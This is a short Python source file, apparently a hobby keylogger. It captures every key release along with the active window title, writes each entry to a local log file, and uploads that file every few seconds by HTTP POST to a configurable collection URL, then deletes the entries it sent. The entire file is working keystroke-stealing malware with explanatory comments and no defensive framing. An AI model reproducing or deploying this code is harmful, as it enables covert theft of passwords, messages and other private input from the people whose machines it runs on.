import keyboard # to get the keys used
import pyautogui # to get window name
import requests # to send logs
import threading # to make log sending repeat in background
from datetime import datetime, timezone # to classify logs by time sent

URL = 'https://127.0.0.1:8000' # the URL/IP to which you want to send the logs to
INTERVAL = 3.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.

def send_log(): # send log
    try:
        with open('log', 'rb') as log: # open the file in read-only mode binary  
            file_payload = {}
            time = str(datetime.now(timezone.utc).time())[:-7].replace(':','.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
            file_name = f'keylogger-log-{time}'
            line_count = len(log.readlines()) # get the number of entries being sent so you know how many to delete from file later
            file_payload = {'file':(file_name, log)} # make the payload for the file containing the file name and the file in binary
            r = requests.post(URL, files=file_payload) # POST (send) the file
            if not r.ok:
                pass # Leaves the entries to go through later if the request didn't go through
            else: # assume new entries were made during process of sending and delete only entries which were already sent
                with open('log','r+') as l:
                    lines = l.readlines() # get all the entries into an array
                    l.seek(0) # go to start of file
                    l.truncate() # erase the whole file before rewriting
                    for number, line in enumerate(lines):
                        if number > line_count:
                            l.write(line) # rewrite the file, writing only lines of entries which weren't already sent
    except requests.exceptions.RequestException:
        pass
    threading.Timer(INTERVAL, send_log).start() # start sending logs again after the amount of seconds specified in INTERVAL

threading.Timer(INTERVAL, send_log).start() # start sending logs after the amount of seconds specified in INTERVAL

# NOTE about threading.Timer(): Each instance of threading.Timer() schedules the function to be played in n seconds in the background.
# Therefore, the first instance of threading.Timer() makes it run the first time, and by adding threading.Timer() into the function itself,
# it recursively repeats forever because each time the function runs it schedules itself to be ran again.

while True:
    key = str(keyboard.read_event()) # get name of key pressed
    if 'up' in key: # log only key releases so no extra entries are made (often 2 key events are logged for when the key is pressed even though 1 character was typed because it is held for a moment)
        key = key[14:-3] # leave only the key name
        window_name = pyautogui.getActiveWindowTitle() # get the window name to know what context caused the keys to be pressed
        entry = f"Key Pressed: {key} Active Window: {window_name}" # make the entry
        print(entry) # for debugging purposes
        try:
            with open("log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
                log.write(entry+'\n') # write the entry into the log
            # Reads the key pressed and active window and writes it into a file.
        except UnicodeEncodeError as e:
            pass